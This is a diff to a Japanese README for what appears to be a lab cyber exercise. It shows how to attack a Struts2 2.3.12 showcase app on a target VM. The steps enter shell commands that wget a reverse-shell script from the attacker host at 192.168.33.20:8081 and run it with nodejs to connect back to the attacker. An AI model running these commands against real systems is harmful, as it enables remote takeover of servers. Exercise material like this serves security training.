@@ -46,8 +46,8 @@ $ vagrant ssh attacker <br>
 	iii. Browse to ht&#8203;tp://attacker.cyexc-attacker:8081/  <br>
 <br>
   <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex1/images/screenshot.png" width=300 title="Screenshot">
-  URL=h&#8203;ttp://target.cyexc-target/struts2-showcase-2.3.12/index.action <br>
-
+  
+  URLに`http://target.cyexc-target/struts2-showcase-2.3.12/index.action`と入力する。 <br>
   CMDはTarget OSで実行したいシェルコマンドを入力する。 <br>
   Reverse Shellスクリプト`wget http://192.168.33.20:8081/reverseShellClient.js`と入力し、Attacker OSからTarget OSにダウンロードした。 
   Target OSからAttacker OSへの接続は`nodejs reverseShellClient.js -i 192.168.33.20`で行った。 
